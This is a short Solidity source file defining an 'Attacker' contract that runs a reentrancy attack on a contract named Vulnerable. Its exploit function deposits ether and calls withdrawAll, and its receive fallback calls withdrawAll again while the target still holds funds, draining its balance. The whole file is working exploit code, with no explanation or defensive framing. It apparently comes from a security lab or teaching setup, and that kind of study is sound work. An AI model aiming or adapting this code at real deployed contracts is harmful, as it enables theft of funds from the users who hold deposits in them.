// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import {Vulnerable} from "./Vulnerable.sol";

contract Attacker {
    Vulnerable public vulnerable;

    constructor(address _vulnerable) {
        vulnerable = Vulnerable(_vulnerable);
    }

    function exploit() public payable {
        require(msg.value >= 1 ether, "Deposit cannot be empty else exploit will not work!");
        vulnerable.deposit{value: msg.value}();
        vulnerable.withdrawAll();
    }

    receive() external payable {
        if (address(vulnerable).balance > 0) {
            vulnerable.withdrawAll();
        }
    }
}
